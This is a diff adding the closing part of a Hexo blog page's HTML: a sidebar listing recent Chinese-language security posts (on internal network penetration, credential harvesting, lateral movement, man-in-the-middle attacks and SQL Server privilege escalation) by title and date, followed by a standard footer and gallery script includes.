+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201215222619.png)" alt="渗透三层网络" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/" class="title">渗透三层网络</a></p>
+                            <p class="item-date"><time datetime="2020-12-12T04:00:00.000Z" itemprop="datePublished">2020-12-12</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/12/10/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201015202633.png)" alt="域内密码凭证获取" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/12/10/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/" class="title">域内密码凭证获取</a></p>
+                            <p class="item-date"><time datetime="2020-12-10T04:00:00.000Z" itemprop="datePublished">2020-12-10</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/18/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201210214814.png)" alt="后渗透之横向移动（一）" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/18/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/" class="title">后渗透之横向移动（一）</a></p>
+                            <p class="item-date"><time datetime="2020-10-18T04:00:00.000Z" itemprop="datePublished">2020-10-18</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/15/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201209092600.png)" alt="中间人攻击的原理和应用" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/15/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8/" class="title">中间人攻击的原理和应用</a></p>
+                            <p class="item-date"><time datetime="2020-10-15T04:00:00.000Z" itemprop="datePublished">2020-10-15</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201127210949.png)" alt="数据库提权(二) sql server 提权" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/" class="title">数据库提权(二) sql server 提权</a></p>
+                            <p class="item-date"><time datetime="2020-10-09T04:00:00.000Z" itemprop="datePublished">2020-10-09</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2020 John Doe</p>
+                
+                <p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="https://github.com/ppoffice" target="_blank">PPOffice</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+    </div>
+    
+
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+
+    
+    
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
